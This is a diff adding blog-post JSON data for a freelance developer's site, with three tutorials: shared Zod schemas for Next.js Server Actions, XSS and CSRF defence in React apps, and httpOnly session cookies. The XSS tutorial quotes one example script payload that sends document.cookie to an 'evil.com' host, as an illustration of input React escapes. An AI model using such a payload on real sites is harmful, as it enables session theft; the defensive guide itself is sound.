+        "type": "paragraph",
+        "text": "Securing web applications requires practical engineering choices that prevent downtime without degrading user experience. Explore my [Full-Stack Web Development Services](/services) to see how I build secure, high-speed applications, or [get in touch with Aafaque](/contact) directly to discuss your project security requirements."
+      }
+    ]
+  },
+  {
+    "id": "end-to-end-type-safety-typescript-zod-server-actions",
+    "slug": "end-to-end-type-safety-typescript-zod-server-actions",
+    "title": "End-to-End Type Safety Across Frontend and Backend with TypeScript, Zod, and Server Actions",
+    "seoTitle": "End-to-End Type Safety: TypeScript, Zod & Actions",
+    "description": "Learn how to build a type-safe full stack architecture using TypeScript, Zod validation, and Next.js Server Actions with zero runtime mismatch.",
+    "publishedAt": "2026-11-07",
+    "updatedAt": "2026-11-07",
+    "readTime": "7 min read",
+    "category": "Security & Architecture",
+    "tags": [
+      "TypeScript",
+      "Zod",
+      "Server Actions",
+      "Next.js",
+      "Web Security"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "End-to-end type safety connects client inputs and database operations using a single shared Zod schema. TypeScript verifies types during development, while Zod parses and validates data at runtime inside Server Actions, eliminating manual API typing and silent serialization bugs.",
+    "relatedProjectId": 17,
+    "faqs": [
+      {
+        "question": "Why is TypeScript alone not enough for full-stack type safety?",
+        "answer": "TypeScript performs compile-time checks only and is completely erased during JavaScript execution. It cannot protect your server against corrupted payloads, malformed JSON, or malicious requests at runtime without a runtime validator like Zod."
+      },
+      {
+        "question": "How do Server Actions eliminate API boilerplate?",
+        "answer": "Server Actions act as remote procedure calls (RPC). Instead of setting up API routes, writing manual fetch calls, and synchronizing request/response interfaces, you import and call the server function directly from your React component with full type inference."
+      },
+      {
+        "question": "What is the performance overhead of using Zod on the server?",
+        "answer": "Zod parsing overhead is negligible, typically running in fractions of a millisecond for typical business objects. The safety gains and prevention of broken database queries far outweigh the tiny CPU cost."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "The Fallacy of 'TypeScript Everywhere'"
+      },
+      {
+        "type": "paragraph",
+        "text": "Many web applications claim to be fully type-safe simply because both the frontend and backend are written in TypeScript. However, the network boundary represents a blind spot. When data moves from an HTML form across HTTP to a server, TypeScript types disappear. If an API endpoint casts incoming request bodies with 'as RequestPayload', you are trusting client input blindly."
+      },
+      {
+        "type": "paragraph",
+        "text": "Real end-to-end type safety requires two distinct mechanisms: static compile-time checking across codebases, and runtime validation at network boundaries. By pairing TypeScript with Zod and Next.js Server Actions, we can build a type-safe full stack architecture where data contracts are enforced strictly on both sides of the wire."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Step 1: Define a Single Source of Truth with Zod"
+      },
+      {
+        "type": "paragraph",
+        "text": "Rather than manually creating a TypeScript interface and a separate validation function, you define a single Zod schema. TypeScript then infers the static type directly from the runtime schema using 'z.infer'."
+      },
+      {
+        "type": "code",
+        "language": "typescript",
+        "caption": "lib/validations/booking.ts - Shared Schema Definition",
+        "code": "import { z } from \"zod\";\n\nexport const BookingSchema = z.object({\n  fullName: z.string().trim().min(3, \"Name must be at least 3 characters\").max(80),\n  email: z.string().trim().email(\"Please provide a valid email address\"),\n  phone: z.string().trim().regex(/^\\+?[1-9]\\d{7,14}$/, \"Invalid international phone number\"),\n  visaType: z.enum([\"tourist_30\", \"tourist_60\", \"transit\"]),\n  passengersCount: z.coerce.number().int().min(1).max(10),\n  travelDate: z.string().refine((date) => !isNaN(Date.parse(date)), {\n    message: \"Valid travel date required\",\n  }),\n});\n\nexport type BookingInput = z.infer<typeof BookingSchema>;"
+      },
+      {
+        "type": "paragraph",
+        "text": "This pattern ensures that changes to field names, validation constraints, or allowed enum values happen in exactly one place. If you add a field to the schema, TypeScript will immediately flag errors anywhere in your client forms or backend handlers where that field is omitted or mismatched."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Step 2: Enforcing Runtime Validation in Server Actions"
+      },
+      {
+        "type": "paragraph",
+        "text": "In Next.js, Server Actions allow you to run server code directly without exposing conventional REST endpoints. Because Server Actions accept FormData or JSON objects, validating inputs through your schema is simple and safe."
+      },
+      {
+        "type": "code",
+        "language": "typescript",
+        "caption": "app/actions/booking.ts - Type-Safe Server Action",
+        "code": "\"use server\";\n\nimport { BookingSchema } from \"@/lib/validations/booking\";\n\nexport type ActionState = {\n  success: boolean;\n  message: string;\n  errors?: Record<string, string[]>;\n};\n\nexport async function submitBookingAction(\n  prevState: ActionState,\n  formData: FormData\n): Promise<ActionState> {\n  const rawData = Object.fromEntries(formData.entries());\n  const validationResult = BookingSchema.safeParse(rawData);\n\n  if (!validationResult.success) {\n    return {\n      success: false,\n      message: \"Validation failed. Please verify your entries.\",\n      errors: validationResult.error.flatten().fieldErrors,\n    };\n  }\n\n  const cleanData = validationResult.data;\n\n  try {\n    // cleanData is fully typed as BookingInput\n    // Proceed to database write or payment gateway call\n    return {\n      success: true,\n      message: `Booking received for ${cleanData.fullName}. Processing request.`,\n    };\n  } catch (error) {\n    return {\n      success: false,\n      message: \"Database operation failed. Please try again later.\",\n    };\n  }\n}"
+      },
+      {
+        "type": "callout",
+        "title": "Production Architecture Tip",
+        "text": "Never use 'BookingSchema.parse()' inside a server action unless you intend to trigger an uncaught boundary error. Always use 'BookingSchema.safeParse()'. It returns an object containing either the typed data or the structured error map without throwing unhandled exceptions."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Real-World Application: Handling Travel Registrations"
+      },
+      {
+        "type": "paragraph",
+        "text": "I implemented this exact end-to-end architecture on [Al Raheeq Tourism](/projects/17), a platform handling tourist visa requests and flight bookings. Travel applications require strict adherence to international passport standards and travel date validations. By sharing schemas between client validation and server actions, we eliminated form submission mismatches completely and prevented invalid submissions before touching downstream database tables."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Step 3: Connecting Client Forms with React 19 useActionState"
+      },
+      {
+        "type": "paragraph",
+        "text": "With React 19 and modern Next.js, handling server responses on the client side no longer requires complex state machines or third-party query wrappers for forms. The 'useActionState' hook handles pending states, error payloads, and successful responses with full type checking."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "components/booking-form.tsx - Client Component",
+        "code": "\"use client\";\n\nimport { useActionState } from \"react\";\nimport { submitBookingAction, type ActionState } from \"@/app/actions/booking\";\n\nconst initialState: ActionState = {\n  success: false,\n  message: \"\",\n};\n\nexport function BookingForm() {\n  const [state, formAction, isPending] = useActionState(submitBookingAction, initialState);\n\n  return (\n    <form action={formAction} className=\"space-y-4 max-w-md mx-auto\">\n      <div>\n        <label htmlFor=\"fullName\" className=\"block text-sm font-medium\">Full Name</label>\n        <input id=\"fullName\" name=\"fullName\" required className=\"border rounded p-2 w-full\" />\n        {state.errors?.fullName && (\n          <p className=\"text-red-500 text-xs mt-1\">{state.errors.fullName[0]}</p>\n        )}\n      </div>\n\n      <div>\n        <label htmlFor=\"email\" className=\"block text-sm font-medium\">Email</label>\n        <input id=\"email\" name=\"email\" type=\"email\" required className=\"border rounded p-2 w-full\" />\n        {state.errors?.email && (\n          <p className=\"text-red-500 text-xs mt-1\">{state.errors.email[0]}</p>\n        )}\n      </div>\n\n      <button\n        type=\"submit\"\n        disabled={isPending}\n        className=\"bg-blue-600 text-white py-2 px-4 rounded disabled:opacity-50\"\n      >\n        {isPending ? \"Submitting...\" : \"Book Application\"}\n      </button>\n\n      {state.message && (\n        <p className={`text-sm ${state.success ? \"text-green-600\" : \"text-red-600\"}`}>\n          {state.message}\n        </p>\n      )}\n    </form>\n  );\n}"
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Architectural Benefits of This Setup"
+      },
+      {
+        "type": "list",
+        "items": [
+          "Zero API Sync Issues: You no longer need to maintain separate Swagger/OpenAPI files or manually keep client fetch types aligned with backend controllers.",
+          "Automatic Bundle Optimization: Zod schemas and validation rules only increase server bundle sizes when imported into server files; your client bundle remains lean.",
+          "Resilient Data Ingestion: Malformed JSON or tampered form fields are stopped at the action layer before they reach database drivers or third-party APIs.",
+          "Progressive Enhancement: Forms work natively with HTML form action semantics, ensuring submissions still complete even on unstable mobile network connections."
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing This in Your Product?"
+      },
+      {
+        "type": "paragraph",
+        "text": "If your team is experiencing bugs caused by unsynchronized API types, unstable form handling, or insecure backend inputs, I can help audit your stack and implement clean type safety across your applications. Explore my [Full-Stack Web Development Services](/services) or [get in touch with Aafaque](/contact) to discuss your project."
+      }
+    ]
+  },
+  {
+    "id": "defending-spas-against-xss-and-csrf",
+    "slug": "defending-spas-against-xss-and-csrf",
+    "title": "Defending Modern Single Page Applications Against Cross-Site Scripting (XSS) and CSRF Attacks",
+    "seoTitle": "Securing Modern SPAs: XSS and CSRF Defense Guide",
+    "description": "Learn practical methods to prevent XSS and defend against CSRF in modern React single page applications using secure headers and HTTP-only cookies.",
+    "publishedAt": "2026-11-06",
+    "updatedAt": "2026-11-06",
+    "readTime": "7 min read",
+    "category": "Security & Architecture",
+    "tags": [
+      "Security",
+      "React",
+      "TypeScript",
+      "Web Architecture"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "To prevent XSS in React, avoid using dangerouslySetInnerHTML and sanitize user input. To defend against CSRF, store session tokens in SameSite HTTP-only cookies instead of localStorage.",
+    "relatedProjectId": 1,
+    "faqs": [
+      {
+        "question": "How do you prevent XSS in React applications?",
+        "answer": "React automatically escapes values embedded in JSX, which protects against most XSS out of the box. However, you must avoid dangerouslySetInnerHTML and validate all data rendered from untrusted sources."
+      },
+      {
+        "question": "Are HttpOnly cookies secure against CSRF?",
+        "answer": "HttpOnly cookies prevent JavaScript from reading your tokens, which stops XSS theft. However, they are still sent automatically by the browser on cross-origin requests, so you must combine them with the SameSite attribute set to Strict or Lax."
+      },
+      {
+        "question": "Should I store JWT authentication tokens in localStorage?",
+        "answer": "No. Storing authentication tokens in localStorage makes them instantly readable by any malicious script injected via an XSS vulnerability. Store session tokens in secure HTTP-only cookies instead."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Understanding the Threat Landscape in Single Page Applications"
+      },
+      {
+        "type": "paragraph",
+        "text": "Modern single page applications shift a massive amount of rendering logic to the client browser. While this creates fast user experiences, it also changes how security vulnerabilities manifest. When building complex business software like [Inventory Management / InvMaster OS](/projects/1), protecting user data and session integrity is non-negotiable. Two common attack vectors threaten client-heavy applications: Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF)."
+      },
+      {
+        "type": "paragraph",
+        "text": "XSS occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute arbitrary JavaScript in the victim's browser. CSRF tricks a authenticated user into executing unwanted actions on a web application in which they are currently authenticated."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Mitigating Cross-Site Scripting (XSS) in React"
+      },
+      {
+        "type": "paragraph",
+        "text": "React protects developers by escaping all content rendered inside JSX expressions by default. If a user inputs malicious markup like `<script>fetch('https://evil.com/'+document.cookie)</script>`, React converts those characters into safe strings rather than executing them."
+      },
+      {
+        "type": "paragraph",
+        "text": "The vulnerability usually appears when developers bypass these built-in protections to render rich text or raw HTML strings using unsafe utilities."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "Unsafe vs Safe HTML Rendering in React",
+        "code": "// DANGEROUS: Opens up XSS if userContent contains malicious scripts\nexport function UnsafeRender({ userContent }) {\n  return <div dangerouslySetInnerHTML={{ __html: userContent }} />;\n}\n\n// SAFE: Use a dedicated sanitization library like DOMPurify if raw HTML is mandatory\nimport DOMPurify from 'dompurify';\n\nexport function SafeRender({ userContent }) {\n  const cleanHtml = DOMPurify.sanitize(userContent);\n  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;\n}"
+      },
+      {
+        "type": "callout",
+        "title": "Rule of Thumb for Input Handling",
+        "text": "Never trust data originating from client input fields, URL parameters, or third-party APIs. Always sanitize on both the client side before rendering and on the server side before storing in the database."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Preventing CSRF via Secure Cookie Architecture"
+      },
+      {
+        "type": "paragraph",
+        "text": "Many applications store JSON Web Tokens (JWT) inside browser `localStorage`. While convenient, this practice leaves tokens vulnerable to XSS theft. If an attacker injects a script, they can read `localStorage.getItem('token')` and ship your session credentials to an external server."
+      },
+      {
+        "type": "paragraph",
+        "text": "The secure alternative is storing session tokens in cookies configured with strict security flags:"
+      },
+      {
+        "type": "list",
+        "items": [
+          "HttpOnly: Blocks client-side JavaScript from reading the cookie, neutralizing XSS token theft.",
+          "Secure: Ensures the cookie is only transmitted over encrypted HTTPS connections.",
+          "SameSite=Strict (or Lax): Prevents the browser from sending the cookie along with cross-site requests, mitigating CSRF attacks."
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Locking Down Security Headers and Content Security Policy (CSP)"
+      },
+      {
+        "type": "paragraph",
+        "text": "Beyond code-level safeguards, your web server must deliver strong HTTP security headers. A robust Content Security Policy (CSP) restricts the domains from which scripts, stylesheets, and images can be loaded."
+      },
+      {
+        "type": "code",
+        "language": "http",
+        "caption": "Recommended Production Security Headers",
+        "code": "Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';\nX-Content-Type-Options: nosniff\nX-Frame-Options: DENY\nStrict-Transport-Security: max-age=63072000; includeSubDomains; preload"
+      },
+      {
+        "type": "paragraph",
+        "text": "Implementing these headers stops clickjacking attempts, prevents MIME-type confusion attacks, and enforces HTTPS connections globally."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing This in Your Product?"
+      },
+      {
+        "type": "paragraph",
+        "text": "As an independent web developer, I build fast, production-ready web applications with security built into the core architecture. [Hire Aafaque Nazir](/services) or [get in touch for a consultation](/contact)."
+      }
+    ]
+  },
+  {
+    "id": "auth-2026-session-cookies-vs-localstorage",
+    "slug": "auth-2026-session-cookies-vs-localstorage",
+    "title": "Full-Stack Authentication in 2026: Why Session Cookies Beat LocalStorage for Security",
+    "seoTitle": "Session Cookies vs LocalStorage: 2026 Auth Security",
+    "description": "Learn why httpOnly session cookies are the standard for web app security in 2026, protecting your React apps from XSS and token theft.",
+    "publishedAt": "2026-11-05",
+    "updatedAt": "2026-11-05",
+    "readTime": "7 min read",
+    "category": "Security & Architecture",
+    "tags": [
+      "Web Security",
+      "Next.js",
+      "React 19",
+      "Supabase"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "In 2026, httpOnly cookies are the standard for web security because they prevent JavaScript from accessing authentication tokens, which stops hackers from stealing sessions through Cross-Site Scripting (XSS) attacks.",
+    "relatedProjectId": 4,
+    "faqs": [
+      {
+        "question": "Is LocalStorage ever safe for storing auth tokens?",
+        "answer": "No. LocalStorage is accessible by any JavaScript running on your page. If a third-party script or a dependency is compromised, your users' tokens can be stolen instantly."
+      },
+      {
+        "question": "How do httpOnly cookies prevent Cross-Site Scripting (XSS)?",
+        "answer": "The 'httpOnly' flag tells the browser that the cookie should not be accessible via document.cookie. This means even if a malicious script runs on your site, it cannot read the session token."
+      },
+      {
+        "question": "Do cookies work with modern frameworks like React and Next.js?",
+        "answer": "Yes. Modern frameworks actually prefer cookies because they allow for Server-Side Rendering (SSR). The server can read the cookie to check authentication before the page even reaches the user's browser."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "The Shift in Web Authentication"
+      },
+      {
+        "type": "paragraph",
+        "text": "For years, many developers stored JWTs (JSON Web Tokens) in LocalStorage because it was easy to use with React. However, as web security threats have evolved, this approach has become a major risk. In 2026, the industry has moved back to server-managed session cookies for one simple reason: they are much harder to steal."
+      },
+      {
+        "type": "paragraph",
+        "text": "When I built the [Restaurant OS / Corner Cafe](/projects/4), security was the top priority. Handling staff logins and owner data required a system where a single malicious browser extension couldn't scrap user credentials. Using httpOnly cookies ensured that sensitive data stayed on the server and out of reach of client-side scripts."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Why LocalStorage is a Security Risk"
+      },
+      {
+        "type": "paragraph",
+        "text": "LocalStorage is a public storage area for your domain. Any JavaScript running on your site—including your analytics tools, chat widgets, or ads—can read everything inside it. This makes it a prime target for Cross-Site Scripting (XSS) attacks. If a hacker finds one small vulnerability in your code, they can extract every logged-in user's token in seconds."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "The httpOnly Cookie Solution"
+      },
+      {
+        "type": "paragraph",
+        "text": "By using cookies with the 'httpOnly' and 'Secure' flags, you create a wall between your authentication data and the browser's JavaScript environment. The browser handles sending the token to your API automatically, but it won't let any script touch it."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "Setting a secure session cookie in Next.js 15+",
+        "code": "import { cookies } from 'next/headers';\n\nexport async function createSession(token: string) {\n  const cookieStore = await cookies();\n\n  cookieStore.set('session_id', token, {\n    httpOnly: true,\n    secure: true,\n    sameSite: 'strict',\n    path: '/',\n    maxAge: 60 * 60 * 24 * 7, // 1 week expiry\n  });\n}"
+      },
+      {
+        "type": "callout",
+        "title": "Pro Tip: Use SameSite=Strict",
+        "text": "Always set the SameSite attribute to 'Strict' or 'Lax' to prevent Cross-Site Request Forgery (CSRF) attacks. This ensures the browser only sends the cookie if the request originates from your own website."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Better Performance with SSR"
+      },
+      {
+        "type": "paragraph",
+        "text": "Security isn't the only benefit. Cookies make Server-Side Rendering (SSR) much faster. Since the browser sends the cookie with the initial page request, your server knows who the user is immediately. You don't have to wait for the React app to load, check LocalStorage, and then fetch user data. This results in a fast, flicker-free experience for your users."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Implementing Secure Auth in Your Project"
+      },
+      {
+        "type": "paragraph",
+        "text": "If you are starting a new project in 2026, avoid the temptation to use LocalStorage for tokens. Whether you are using Supabase, Auth0, or a custom backend, configure your middleware to handle cookies. This small architectural change protects your users and makes your application much more reliable."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing This in Your Product?"
+      },
+      {
+        "type": "paragraph",
+        "text": "As an independent web developer, I build fast, production-ready web applications with a focus on security and performance. [Hire Aafaque Nazir](/services) for your next project or [get in touch for a consultation](/contact) to review your current authentication setup."
+      }
+    ]
+  },
+  {
     "id": "building-fast-react-product-filters-url-state",
     "slug": "building-fast-react-product-filters-url-state",
     "title": "Building Fast Multi-Faceted Product Filters with React and URL State",
